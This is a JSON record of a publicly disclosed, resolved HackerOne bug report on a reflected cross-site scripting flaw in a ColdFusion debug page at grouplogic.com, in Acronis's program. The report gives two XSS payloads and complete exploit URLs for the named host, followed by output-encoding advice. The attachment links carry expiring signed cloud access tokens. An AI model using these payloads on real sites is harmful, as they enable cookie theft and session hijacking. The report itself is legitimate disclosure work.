@@ -1,0 +1,146 @@
+{
+  "id": 1166918,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTY2OTE4",
+  "url": "https://hackerone.com/reports/1166918",
+  "title": "Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2021-04-16T19:49:43.244Z",
+  "submitted_at": "2021-04-16T19:49:43.486Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ub3rsick",
+    "url": "/ub3rsick",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/nfpsdkxk8j5neuevf0nsobxx89nm/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13428,
+    "url": "https://hackerone.com/acronis",
+    "handle": "acronis",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Acronis",
+      "twitter_handle": "Acronis",
+      "website": "https://www.acronis.com",
+      "about": "Complete integrated cybersecurity and data protection for MSPs and IT teams"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-06-14T10:20:47.690Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-06-11T16:26:27.681Z",
+  "team_member_agreed_on_going_public_at": "2022-06-14T10:20:47.570Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nThe ColdFusion Debugging Panel exposed at below URL.\n```\nhttp://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=\n```\nThe **userPage** parameter is not properly sanitized and is displayed  without proper output encoding. This results in reflected cross site scripting.\n\n## Steps To Reproduce\n\nEnter any of below payload in the **userPage** parameter and access the URL:\n\n```\nPayload 1: Mouse Over XSS\n---------------------------\n%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>\n\n\nPayload 2: \n---------\n%0d%0a</script><img+src=x+onerror=alert(document.domain)>\n\n```\n\nOr Just access below URLs in browser:\n\n```\nhttp://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>\n\nhttp://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><img+src=x+onerror=alert(document.domain)>\n\n```\n\n\n## Recommendations\nIt is highly recommended to implement output encoding.\n\nEncode the following characters with HTML entity encoding to prevent switching into any execution context, such as script, style, or event handlers. Using hex entities is recommended in the spec. The 5 characters significant in XML ```(&, <, >, \", ')```:\n```\n & --> &amp;\n < --> &lt;\n > --> &gt;\n \" --> &quot;\n ' --> &#x27;\n```\n\nReference: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n\n## Impact\n\nXSS can be used to :\n- Steal cookies, password\n- Website Defacement\n- Redirect Victim to Malicious site\n- Log keystrokes etc.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1268346,
+      "file_name": "GroupLogic-CF_DBG_PANEL_XSS_01.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gdoayu44ehpjs08fbys4fwn4a6wi?response-content-disposition=attachment%3B%20filename%3D%22GroupLogic-CF_DBG_PANEL_XSS_01.png%22%3B%20filename%2A%3DUTF-8%27%27GroupLogic-CF_DBG_PANEL_XSS_01.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVETB6NTJ%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T232751Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJHMEUCIQCYnko1tMVzQaQ44fz7rO80zexmhh2%2FLqdPjZ4gDJjHTAIgdorI8tGUcvQvsAKCxGLcjr9sd%2BJ026hdb1p84pF%2B18YqugUI9v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDIHUt0Xxh8Fh3tz0GSqOBUppGn7A3c4oWm7vMmwVvkuUj3TQgXMso%2FSyeExTvBTlGRRlCy5e6oM6JaJtD8ezJoCN6jrY7TXJ7BG9Z%2Fs%2FRnPXME39pzTlppIPJug6ByZ%2FTfrU0ubZ%2Fc91w99L8rB4kqHpjhA6YRj7uVEb3RjExDPIyvf%2BuNeiQS9nt%2FNqghxB4YHGB0EA3vavAII%2FKBJOR9um91KYYvacIabStfej44EZO9EvkVO04%2Bt26s3nYDk5rdQpHWOAZI8eUkYXRkNMneVhVOJzj9qm8uZNM73T1TTk6tX6Nw4XqGpJPK1tW38IY1qfUS9ycwY%2Bn410n28iaQfvCr5Uddd9apL5K%2Bw3v3kxMvd2QzfepYbT5bJE6Rpej%2BfRxg5cDr%2B16u9sOYVmoge9AteGT5QtBxvBsyDOFleNLD42RyUXnGtlbiPe5XdtlTswhnHl8VDlWfczQ%2FMHtuybt1teIudbnaIFR0TV%2B3h1jzykB2m4qkDfMyQwM6mqIc6aLlqpKV0cbnDfWbj4I8FhoJt2HwVbZJGFNYdj2dBJi7ApQkDgJIUXcbY5cT7pXZK6kU4Tm9m%2BuI%2Br8uW27MvE1AefLtWvZqGZIGERkT9kPN6dH5jaWlg9%2B%2FfM5mH6op%2Fkc%2B3j6HwNc%2BZWWQWaao3WDXM5Vp3%2FxOLeSyczFkRTiQQyeEeT1K8G5mRpTBOerlt2npzMWSF5o5o%2B0jlp9EhmBfRIHwn3Rl%2FNJYllugDGRrAvamtsk2ecMfchFXEaaOI7KaIynC2Jm0cTpjx2MXdfXB%2F9kakgXPgvkLBnhBt4PIEiiUI1hozbLzmZDcNyAykwM%2BQbh5wq5RwXemft1m3Y2fxp8pMsqXYHcuakmekzsjeFNON7zS3Yz1jiKjDUpbzGBjqxAQ1mXx%2Fmv4lCG9meklEB9YnHcqq5vuyXfLgnZI6zGjXvmgoQBRLHlWST%2F0k9ddAF2Yv7FQ0RbL6JgRcSaO5uI%2BmvaCY%2BE0PB9FSN27w%2FHgnHB1vM%2BGT5%2ByGxGPxyY2I%2Fb%2BiBEmEf3VZG0axRZ5tINJZDjkSkTWdPPAQnB%2BnAvi5ywcvTxVdxSU9jk20mJ0awmb6z9AnfkVscGPkg1KCZZ54nRsl%2F2uDcxL6s4iPU%2FtvI9A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1f1cdc6fa08fddc8808a08a89a40e56fc8e39120aeb9d34f27e439455bfd4d30",
+      "file_size": 58336,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1268347,
+      "file_name": "GroupLogic-CF_DBG_PANEL_XSS_02.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ksayr2506qdipmfd3izpvbs6jnll?response-content-disposition=attachment%3B%20filename%3D%22GroupLogic-CF_DBG_PANEL_XSS_02.png%22%3B%20filename%2A%3DUTF-8%27%27GroupLogic-CF_DBG_PANEL_XSS_02.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVETB6NTJ%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T232751Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJHMEUCIQCYnko1tMVzQaQ44fz7rO80zexmhh2%2FLqdPjZ4gDJjHTAIgdorI8tGUcvQvsAKCxGLcjr9sd%2BJ026hdb1p84pF%2B18YqugUI9v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDIHUt0Xxh8Fh3tz0GSqOBUppGn7A3c4oWm7vMmwVvkuUj3TQgXMso%2FSyeExTvBTlGRRlCy5e6oM6JaJtD8ezJoCN6jrY7TXJ7BG9Z%2Fs%2FRnPXME39pzTlppIPJug6ByZ%2FTfrU0ubZ%2Fc91w99L8rB4kqHpjhA6YRj7uVEb3RjExDPIyvf%2BuNeiQS9nt%2FNqghxB4YHGB0EA3vavAII%2FKBJOR9um91KYYvacIabStfej44EZO9EvkVO04%2Bt26s3nYDk5rdQpHWOAZI8eUkYXRkNMneVhVOJzj9qm8uZNM73T1TTk6tX6Nw4XqGpJPK1tW38IY1qfUS9ycwY%2Bn410n28iaQfvCr5Uddd9apL5K%2Bw3v3kxMvd2QzfepYbT5bJE6Rpej%2BfRxg5cDr%2B16u9sOYVmoge9AteGT5QtBxvBsyDOFleNLD42RyUXnGtlbiPe5XdtlTswhnHl8VDlWfczQ%2FMHtuybt1teIudbnaIFR0TV%2B3h1jzykB2m4qkDfMyQwM6mqIc6aLlqpKV0cbnDfWbj4I8FhoJt2HwVbZJGFNYdj2dBJi7ApQkDgJIUXcbY5cT7pXZK6kU4Tm9m%2BuI%2Br8uW27MvE1AefLtWvZqGZIGERkT9kPN6dH5jaWlg9%2B%2FfM5mH6op%2Fkc%2B3j6HwNc%2BZWWQWaao3WDXM5Vp3%2FxOLeSyczFkRTiQQyeEeT1K8G5mRpTBOerlt2npzMWSF5o5o%2B0jlp9EhmBfRIHwn3Rl%2FNJYllugDGRrAvamtsk2ecMfchFXEaaOI7KaIynC2Jm0cTpjx2MXdfXB%2F9kakgXPgvkLBnhBt4PIEiiUI1hozbLzmZDcNyAykwM%2BQbh5wq5RwXemft1m3Y2fxp8pMsqXYHcuakmekzsjeFNON7zS3Yz1jiKjDUpbzGBjqxAQ1mXx%2Fmv4lCG9meklEB9YnHcqq5vuyXfLgnZI6zGjXvmgoQBRLHlWST%2F0k9ddAF2Yv7FQ0RbL6JgRcSaO5uI%2BmvaCY%2BE0PB9FSN27w%2FHgnHB1vM%2BGT5%2ByGxGPxyY2I%2Fb%2BiBEmEf3VZG0axRZ5tINJZDjkSkTWdPPAQnB%2BnAvi5ywcvTxVdxSU9jk20mJ0awmb6z9AnfkVscGPkg1KCZZ54nRsl%2F2uDcxL6s4iPU%2FtvI9A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb2f1294cee3f4978f0c43f48b6c70aaeae058138ccde30b3d43d0fdbebbbbd5",
+      "file_size": 107062,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1268348,
+      "file_name": "GroupLogic-CF_DBG_PANEL_XSS_03.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/skqd1wfpoeaf1ap6n2aop9x5meju?response-content-disposition=attachment%3B%20filename%3D%22GroupLogic-CF_DBG_PANEL_XSS_03.png%22%3B%20filename%2A%3DUTF-8%27%27GroupLogic-CF_DBG_PANEL_XSS_03.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVETB6NTJ%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T232751Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJHMEUCIQCYnko1tMVzQaQ44fz7rO80zexmhh2%2FLqdPjZ4gDJjHTAIgdorI8tGUcvQvsAKCxGLcjr9sd%2BJ026hdb1p84pF%2B18YqugUI9v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDIHUt0Xxh8Fh3tz0GSqOBUppGn7A3c4oWm7vMmwVvkuUj3TQgXMso%2FSyeExTvBTlGRRlCy5e6oM6JaJtD8ezJoCN6jrY7TXJ7BG9Z%2Fs%2FRnPXME39pzTlppIPJug6ByZ%2FTfrU0ubZ%2Fc91w99L8rB4kqHpjhA6YRj7uVEb3RjExDPIyvf%2BuNeiQS9nt%2FNqghxB4YHGB0EA3vavAII%2FKBJOR9um91KYYvacIabStfej44EZO9EvkVO04%2Bt26s3nYDk5rdQpHWOAZI8eUkYXRkNMneVhVOJzj9qm8uZNM73T1TTk6tX6Nw4XqGpJPK1tW38IY1qfUS9ycwY%2Bn410n28iaQfvCr5Uddd9apL5K%2Bw3v3kxMvd2QzfepYbT5bJE6Rpej%2BfRxg5cDr%2B16u9sOYVmoge9AteGT5QtBxvBsyDOFleNLD42RyUXnGtlbiPe5XdtlTswhnHl8VDlWfczQ%2FMHtuybt1teIudbnaIFR0TV%2B3h1jzykB2m4qkDfMyQwM6mqIc6aLlqpKV0cbnDfWbj4I8FhoJt2HwVbZJGFNYdj2dBJi7ApQkDgJIUXcbY5cT7pXZK6kU4Tm9m%2BuI%2Br8uW27MvE1AefLtWvZqGZIGERkT9kPN6dH5jaWlg9%2B%2FfM5mH6op%2Fkc%2B3j6HwNc%2BZWWQWaao3WDXM5Vp3%2FxOLeSyczFkRTiQQyeEeT1K8G5mRpTBOerlt2npzMWSF5o5o%2B0jlp9EhmBfRIHwn3Rl%2FNJYllugDGRrAvamtsk2ecMfchFXEaaOI7KaIynC2Jm0cTpjx2MXdfXB%2F9kakgXPgvkLBnhBt4PIEiiUI1hozbLzmZDcNyAykwM%2BQbh5wq5RwXemft1m3Y2fxp8pMsqXYHcuakmekzsjeFNON7zS3Yz1jiKjDUpbzGBjqxAQ1mXx%2Fmv4lCG9meklEB9YnHcqq5vuyXfLgnZI6zGjXvmgoQBRLHlWST%2F0k9ddAF2Yv7FQ0RbL6JgRcSaO5uI%2BmvaCY%2BE0PB9FSN27w%2FHgnHB1vM%2BGT5%2ByGxGPxyY2I%2Fb%2BiBEmEf3VZG0axRZ5tINJZDjkSkTWdPPAQnB%2BnAvi5ywcvTxVdxSU9jk20mJ0awmb6z9AnfkVscGPkg1KCZZ54nRsl%2F2uDcxL6s4iPU%2FtvI9A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1d871fea1024aaf269ef63c49cae35843bbbfa0ea8c5b9c37ad961b96f834bee",
+      "file_size": 31277,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1268349,
+      "file_name": "GroupLogic-CF_DBG_PANEL_XSS_04.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y0hzy9dolq5sn4iu8ujfo358mrbl?response-content-disposition=attachment%3B%20filename%3D%22GroupLogic-CF_DBG_PANEL_XSS_04.png%22%3B%20filename%2A%3DUTF-8%27%27GroupLogic-CF_DBG_PANEL_XSS_04.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVETB6NTJ%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T232751Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJHMEUCIQCYnko1tMVzQaQ44fz7rO80zexmhh2%2FLqdPjZ4gDJjHTAIgdorI8tGUcvQvsAKCxGLcjr9sd%2BJ026hdb1p84pF%2B18YqugUI9v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDIHUt0Xxh8Fh3tz0GSqOBUppGn7A3c4oWm7vMmwVvkuUj3TQgXMso%2FSyeExTvBTlGRRlCy5e6oM6JaJtD8ezJoCN6jrY7TXJ7BG9Z%2Fs%2FRnPXME39pzTlppIPJug6ByZ%2FTfrU0ubZ%2Fc91w99L8rB4kqHpjhA6YRj7uVEb3RjExDPIyvf%2BuNeiQS9nt%2FNqghxB4YHGB0EA3vavAII%2FKBJOR9um91KYYvacIabStfej44EZO9EvkVO04%2Bt26s3nYDk5rdQpHWOAZI8eUkYXRkNMneVhVOJzj9qm8uZNM73T1TTk6tX6Nw4XqGpJPK1tW38IY1qfUS9ycwY%2Bn410n28iaQfvCr5Uddd9apL5K%2Bw3v3kxMvd2QzfepYbT5bJE6Rpej%2BfRxg5cDr%2B16u9sOYVmoge9AteGT5QtBxvBsyDOFleNLD42RyUXnGtlbiPe5XdtlTswhnHl8VDlWfczQ%2FMHtuybt1teIudbnaIFR0TV%2B3h1jzykB2m4qkDfMyQwM6mqIc6aLlqpKV0cbnDfWbj4I8FhoJt2HwVbZJGFNYdj2dBJi7ApQkDgJIUXcbY5cT7pXZK6kU4Tm9m%2BuI%2Br8uW27MvE1AefLtWvZqGZIGERkT9kPN6dH5jaWlg9%2B%2FfM5mH6op%2Fkc%2B3j6HwNc%2BZWWQWaao3WDXM5Vp3%2FxOLeSyczFkRTiQQyeEeT1K8G5mRpTBOerlt2npzMWSF5o5o%2B0jlp9EhmBfRIHwn3Rl%2FNJYllugDGRrAvamtsk2ecMfchFXEaaOI7KaIynC2Jm0cTpjx2MXdfXB%2F9kakgXPgvkLBnhBt4PIEiiUI1hozbLzmZDcNyAykwM%2BQbh5wq5RwXemft1m3Y2fxp8pMsqXYHcuakmekzsjeFNON7zS3Yz1jiKjDUpbzGBjqxAQ1mXx%2Fmv4lCG9meklEB9YnHcqq5vuyXfLgnZI6zGjXvmgoQBRLHlWST%2F0k9ddAF2Yv7FQ0RbL6JgRcSaO5uI%2BmvaCY%2BE0PB9FSN27w%2FHgnHB1vM%2BGT5%2ByGxGPxyY2I%2Fb%2BiBEmEf3VZG0axRZ5tINJZDjkSkTWdPPAQnB%2BnAvi5ywcvTxVdxSU9jk20mJ0awmb6z9AnfkVscGPkg1KCZZ54nRsl%2F2uDcxL6s4iPU%2FtvI9A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=33e006783d0edb4a4ee6f781cc52d4edd4f33e08be810df5e4010ef28b0b4f13",
+      "file_size": 103746,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 4,
+  "voters": [
+    "zy9ard3",
+    "7odamoo",
+    "shivammusic",
+    "meispi"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 13996,
+    "asset_type": "OTHER",
+    "asset_identifier": "Other Acronis Domains",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
